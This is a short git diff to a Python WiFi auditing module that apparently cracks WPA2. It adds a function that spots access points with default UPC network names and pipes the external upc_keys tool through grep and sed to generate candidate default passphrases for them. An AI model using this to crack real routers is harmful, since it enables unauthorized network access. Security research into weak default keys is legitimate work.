@@ -24,10 +24,14 @@ Martin Vondracek
 """
 import logging
 import os
+import pipes
+import re
 import subprocess
 import tempfile
 import time
 from enum import Enum, unique
+from io import StringIO
+from typing import List, TextIO
 
 import pkg_resources
 
@@ -209,6 +213,25 @@ class Wpa2Cracker(object):
 
         # remove state
         self.state = None
+
+
+def get_personalized_dictionaries(target: WirelessAccessPoint) -> List[TextIO]:
+    """
+    Create and return dictionary personalized by available AP details.
+    :param target: targeted AP
+    :rtype: List[TextIO]
+    :return: list of opened personalized dictionaries
+    """
+    dictionaries = []
+    if re.match(r'^UPC\d{7}$', target.essid):
+        t = pipes.Template()
+        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')  # TODO(xvondr20) 5 GHz?
+        t.append('grep "  -> WPA2 phrase for "', '--')
+        t.append('sed "s/^  -> WPA2 phrase for \S* = \'\(.*\)\'$/\\1/"', '--')
+        d = t.open('dictionary-pipeline', 'r')
+        dictionaries.append(d)
+
+    return dictionaries
 
 
 class Wpa2Attacker(object):
